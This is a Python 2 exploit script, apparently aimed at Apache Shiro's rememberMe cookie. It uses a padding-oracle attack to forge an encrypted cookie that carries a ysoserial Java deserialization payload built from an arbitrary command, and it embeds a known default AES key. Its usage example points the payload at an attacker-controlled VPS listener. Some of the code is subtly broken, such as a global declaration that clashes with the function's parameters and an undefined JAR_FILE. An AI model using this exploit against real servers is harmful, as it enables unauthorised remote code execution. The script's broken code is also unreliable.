# coding=utf-8
import sys
import base64
from Crypto.Cipher import AES
import requests
import struct
import logging
import time
import os
import subprocess

logger = logging.getLogger(__file__)
logger.addHandler(logging.StreamHandler())
logger.setLevel(logging.DEBUG)
def _init(URL,VALID_COOKIE):
	global URL,VALID_COOKIE
	JAR_FILE = 'ysoserial.jar'
	libs = ["JRMPClient","JRMPListener","CommonsBeanutils1","BeanShell1","C3P0","Clojure","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","FileUpload1","Groovy1","Hibernate1","Hibernate2","JBossInterceptors1","JSON1","JavassistWeld1","Jdk7u21","Jython1","MozillaRhino1","Myfaces1","Myfaces2","ROME","Spring1","Spring2","URLDNS","Wicket1",]
	BLOCK_SIZE = 16
	URL = URL
	VALID_COOKIE = base64.b64decode(VALID_COOKIE)


"""
该函数只是为了写exp时检验用，key是动态调试抠出来的
key = b'\x90\xf1\xfe\x6c\x8c\x64\xe4\x3d\x9d\x79\x98\x88\xc5\xc6\x9a\x68'
print(base64.b64encode(key))
1.encrypted_text : 密文
解密密文，写入文件decrypt.bin
"""
def decode_rememberme_file(encrypted_text):	
	key = "kPH+bIxk5D2deZiIxcaaaA=="
	mode =  AES.MODE_CBC
	IV   = encrypted_text[:16]
	encryptor = AES.new(base64.b64decode(key), mode, IV=IV)
	remember_bin = encryptor.decrypt(encrypted_text[16:])
	with open("decrypt.bin", 'wb+') as fpw:
		fpw.write(remember_bin)


"""
生成payload
command : 命令
fp : ysoserial的路径
libs : 所使用的依赖
return plaintext  : payload的hex字符串
"""
def generator(command, fp,libs):
	if not os.path.exists(fp):
		raise Exception('jar file not found!')    
	popen = subprocess.Popen(['java', '-jar', fp,libs, command],stdout=subprocess.PIPE)
	pad = lambda s: s + ((BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)).encode()
	payload = pad(popen.stdout.read())
	plaintext = payload.encode('hex')
	return plaintext



def brute(url, valid_cookie, append_data):
	headers = {'Cookie': 'rememberMe=' + base64.b64encode(valid_cookie + append_data)}
	try:
		resp = requests.get(url, headers=headers)
	except Exception as e:
		logger.exception(e)
	else:
		resp_headers = resp.headers
		set_cookie = resp_headers.get('Set-Cookie')
		if "rememberMe=deleteMe;" in set_cookie:
			return False
		else:
			return True
	return False

"""

:param plaintext: 明文数据，为bytearray类型
:param last_block:
:return:
"""
def encrypt(plaintext, last_block=None):
	if not isinstance(plaintext, bytearray):
		plaintext = bytearray(plaintext)
	# assert isinstance(last_block, bytearray)
	# 预处理明文数据，对其进行填充
	block_count = (len(plaintext) // BLOCK_SIZE) + 1
	padding_bytes = BLOCK_SIZE - len(plaintext) % BLOCK_SIZE
	padding_plaintext = plaintext + (padding_bytes * chr(padding_bytes))

	logger.info("padding oracle start")
	# 对明文进行分组
	plaintext_blocks = []
	for i in range(block_count):
		plaintext_blocks.append(padding_plaintext[i * BLOCK_SIZE:(i + 1) * BLOCK_SIZE])

	# 处理初始的last_block
	if last_block is None:
		last_block = bytearray('a' * BLOCK_SIZE)
	# 逆向数据加密
	result = [last_block]
	index = 1
	for block in reversed(plaintext_blocks):
		logger.info("round: {}".format(index))
		last_block = _get_block_encrypt(block, last_block)
		result.append(last_block)
		index = index + 1
	# 返回 iv + 被加密的数据
	return str(bytearray('').join(reversed(result)))

"""对一个块进行加密操作

:param block: 需要被加密的块
:param next_block: 下一个明文块
:return: block的密文
"""
def _get_block_encrypt(block, next_block):
	result = bytearray('\x00' * BLOCK_SIZE)
	# 从后向前逐位爆破
	for index in range(BLOCK_SIZE - 1, -1 , -1):
		result[index] = _find_character_encrypt(index, result, next_block)
	# 加密数据
	for i in range(0, BLOCK_SIZE):
		result[i] ^= block[i]
	return result

"""
对输入的block，填充正确返回True，填充错误返回False
"""
def do_decrypt(block):
	append_data = str(block)
	if brute(URL, VALID_COOKIE, append_data):
		#logger.info('Found: {}'.format(append_data.encode('hex')))
		return True
	else:
		return False

"""

:param index: 当前爆破的索引
:param result: 当前已爆破出来的结果
:param next_block: 下一个分组的密文
:return: 当前索引爆破出的结果
"""
def _find_character_encrypt(index, result, next_block):
	padding_chr = chr(BLOCK_SIZE - index)
	# 初始化block，将已经爆破的结果置为0
	block = bytearray("\x00" * BLOCK_SIZE)
	for i in range(index, BLOCK_SIZE):
		block[i] = ord(padding_chr) ^ result[i]
	#
	for c in range(0, 256):
		block[index] = ord(padding_chr) ^ next_block[index] ^ c
		if do_decrypt(block + next_block):
			return block[index] ^ ord(padding_chr)

"""
url : 目标地址
payload : rememberMe（base64）
"""
def poc(url,payload):
	if '://' not in url:
		target = 'https://%s' % url if ':443' in url else 'http://%s' % url
	else:
		target = url
	proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
	try:
		r = requests.get(target, cookies={'rememberMe': payload},verify=False)  # 发送验证请求
	except Exception as e:
		print(e)


def main():
	URL = sys.argv[1]
	VALID_COOKIE = sys.argv[2]
	Command = sys.argv[3]
	Type = sys.argv[4]
	_init(URL,VALID_COOKIE)
	payload =  generator(Command,JAR_FILE,Type)
	payload = payload.decode('hex')
	result = base64.b64encode(encrypt(payload))
	poc(URL,result)
	"""
	example:
	python2 Shrio721.py  http://192.168.78.166:8080/samples-web-1.4.1/  Valid_Cookie  VPS:1099   JRMPClient
	"""

if __name__ == '__main__':
	main()
